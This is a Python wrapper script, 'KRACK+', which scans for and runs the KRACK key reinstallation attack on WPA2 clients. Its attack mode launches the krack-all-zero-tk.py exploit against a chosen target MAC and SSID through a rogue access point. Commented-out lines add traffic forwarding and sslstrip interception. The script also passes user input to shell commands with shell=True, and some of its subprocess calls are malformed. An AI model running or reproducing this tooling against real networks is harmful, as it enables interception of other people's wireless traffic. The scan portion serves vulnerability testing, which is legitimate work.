#!/usr/bin/env python
import sys
import optparse
import subprocess
import atexit
import logging

from parser import attackParser
from parser import scanParser
from parser import writeResults

from multiprocessing import Process
from colorlog import ColoredFormatter
from subprocess import check_output

# For colored output
LOGFORMAT = "%(log_color)s%(message)s%(reset)s"
LOG_LEVEL = logging.DEBUG
logging.root.setLevel(LOG_LEVEL)
formatter = ColoredFormatter(LOGFORMAT)
stream = logging.StreamHandler()
stream.setLevel(LOG_LEVEL)
stream.setFormatter(formatter)
log = logging.getLogger('pythonConfig')
log.setLevel(LOG_LEVEL)
log.addHandler(stream)

########   Examples which gives dirrent colored output    #################
#log.debug("A quirky message only developers care about")             WHITE
#log.info("Curious users might want to know this")                    GREEN
#log.warn("Something is wrong and any user should be informed")       YELLOW
#log.error("Serious stuff, this is red for a reason")                 RED
#log.critical("OH NO everything is on fire")                          SUPER RED/ORANGE

log.debug("KRACK+ is a tool to scan for and exploit the KRACK vulnerability in WPA2, discovered by Mathy Vanhoef.")
log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")

def main():
    USAGE = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
    path = "~/krack/"
    parser = optparse.OptionParser(usage=USAGE)

    # Getting interface name to be used as nic_mon automatically so user wont have to specify them
    process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==3'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
    out, err = process.communicate()
    nic_mon = out
    # Getting interface name to be used as nic_rogue automatically so user wont have to specify them    
    process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==4'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
    out, err = process.communicate()
    nic_rogue = out

    # KRACK+ Attack options
    parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
    parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
    parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
    parser.add_option('--nic-mon', default=nic_mon,  help="This option is used to specify Wireless monitor interface that will listen on the"
                        "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
    parser.add_option('--nic-rogue-ap', default=nic_rogue, help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                        "using a modified hostapd.", dest='rogue')

    # KRACK+ Scan options
    parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
                      " Simply connect to the network and the scan will be executed against the connected device.", dest='scan', default=False, action='store_true')
    parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')
    parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
                      " Password length has to be 8 characters or more!", dest='password')
    parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan", dest='debug', action='store_true')
    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan (debugging purposes).", dest='dd', action='store_true')
    parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')


    # General KRACK+ options:
    parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
    
    options, args = parser.parse_args()
    
    ############# SCAN ################
    if options.scan and not options.attack:

        # Write the credentials to file, so that they can be used next time the progran runs.
        with open('./networkCredentials.txt', 'w') as netCredentials:
            if len(options.password) >= 8:
                netCredentials.write(options.ssid + '\n' + options.password)
	    else:
                log.warn("Password length has to be longer than 8 characters, try again or don't specify password; default would be 'abcdefgh'.")
                sys.exit()
	
	# Attempt to launch scan, write output to file and display parsed output on screen
        try:
            subprocess.call(["./prepareClientScan.sh"])
            log.info("Running KRACK+ Scan:")
            log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
            log.warn("Press 'ctrl-c' to end scan and generate PDF of findings. Scan will end 1.5 minutes after last connected device.")
      	    with open('./scanOutput.txt', 'w') as scanOutput:
		if options.scan and options.debug:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
		elif options.scan and options.dd:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --debug"], shell=True)
		else:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
            	    scanParser() 
    
        except(KeyboardInterrupt, SystemExit):
		subprocess.call(["clear"], shell=True)
                log.info("Cleaning up and generating PDF report of findings...")
                subprocess.call(["./restoreClientWifi.sh"])
                writeResults()
		if options.path:
                	subprocess.call(["./genPDF.py " + options.path], shell=True)
			log.info("PDF generated in '" + options.path + "'.")
		else: 
			subprocess.call("./genPDF.py")	
			log.info("PDF generated in '" + path + "'.")
                subprocess.call(["rm scanOutput.txt"], shell=True)
                subprocess.call(["rm scannedMacIP.txt"], shell=True)
                subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
                subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
                
        except:
            log.error("Error occurred.")
            log.info("Restoring internet connection.")
            subprocess.call(["./restoreClientWifi.sh"])


    ############# ATTACK ################
    elif options.attack and options.mon and options.rogue and options.target and options.targetSSID and not options.scan:
        try:
            print("Performing key reinstallation attack")
            #Sets up dependencies before the attack script runs
            subprocess.call(["./prepareClientAttack.sh"])         
            with open('./attackOutput.txt', 'w') as attackOutput:
                # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
                #subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
                #subprocess.call(["sslstrip -w sslstrip.log &"])
            	attackParser()

        except KeyboardInterrupt:
   	    subprocess.call(["clear"], shell=True)
            log.info("Cleaning up and restoring wifi ...")
	    subprocess.call(["rm attackOutput.txt"], shell=True)
            subprocess.call(["./restoreClientWifi.sh"])
	except:
	    subprocess.call(["clear"], shell=True)
            log.info("Error occurred. Restoring wifi ...")
            subprocess.call(["rm attackOutput.txt"], shell=True)
            subprocess.call(["./restoreClientWifi.sh"])

    ############# RESTORE INTERNET ################        
    elif options.restore:
        log.debug("Restoring internet connection")
        subprocess.call(["./restoreClientWifi.sh"])
        log.info("Done, it'll take a few seconds for the client to connect to your Wi-Fi again, if 'auto-reconnect' is enabled on your device")

    ########## NO OPTION OR WRONG USAGE ###########    
    elif options.attack and options.scan:
        log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
        parser.print_help()
    else:
        log.warn("No option was given or there were missing arguments, please see usage below and try again!")
        parser.print_help()

if __name__ == '__main__':
    main()
